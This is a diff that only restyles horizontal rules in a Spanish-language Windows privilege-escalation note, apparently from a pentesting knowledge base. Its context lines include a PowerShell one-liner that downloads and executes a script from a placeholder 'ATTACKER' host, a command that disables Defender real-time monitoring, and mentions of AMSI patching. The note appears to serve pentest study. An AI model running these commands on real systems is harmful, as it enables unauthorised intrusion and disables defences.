@@ -75,7 +75,7 @@ linked:
 ---
 # Windows Privilege Escalation
 
-***
+---
 
 ## Overview
 
@@ -85,7 +85,7 @@ Contexto inicial asumido: shell como user estándar (RDP, WinRM, webshell, SSH, 
 
 > Regla: `whoami /all`, `systeminfo`, `net user`, `net localgroup administrators`, `net user $env:USERNAME /domain` antes de nada.
 
-***
+---
 
 ## 1. Enumeración automatizada
 
@@ -173,7 +173,7 @@ Si el host está unido a dominio, escalada local puede no ser necesaria — atac
 - Defender bypass — obfuscación, AMSI patching, `Set-MpPreference -DisableRealtimeMonitoring $true` (requiere admin, útil post-escalada).
 - LOLBAS — [[Windows LOTL Port Scanning]] y catálogo [lolbas-project.github.io](https://lolbas-project.github.io/).
 
-***
+---
 
 ## Checklist de triage inicial
 
@@ -200,7 +200,7 @@ PowerShell oneliner downloads:
 IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1')
 ```
 
-***
+---
 
 ## Recursos
 
@@ -210,4 +210,4 @@ IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1')
 - [[Windows PrivEsc Payloads]] — payloads listos para lanzar.
 - [[Windows Post-Explotación]] — qué hacer después.
 
-***
+---
